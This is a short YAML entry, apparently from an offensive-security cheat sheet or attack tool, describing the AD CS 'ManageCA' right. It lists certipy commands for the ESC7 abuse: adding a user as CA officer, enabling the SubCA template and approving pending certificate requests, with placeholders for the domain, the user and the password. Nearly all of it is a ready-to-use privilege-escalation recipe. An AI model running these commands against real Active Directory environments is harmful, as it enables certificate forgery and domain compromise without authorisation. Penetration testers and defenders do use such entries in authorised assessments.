name: ManageCA
description: CA Administrator - can issue/revoke certificates and modify CA config
commands:
- '# ESC7 - Enable SAN specification on CA'
- certipy ca -ca '<CA_NAME>' -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
- ''
- '# Enable SubCA template'
- certipy ca -ca '<CA_NAME>' -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
- ''
- '# Approve pending certificate requests'
- certipy ca -ca '<CA_NAME>' -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
opsec: []
references: []
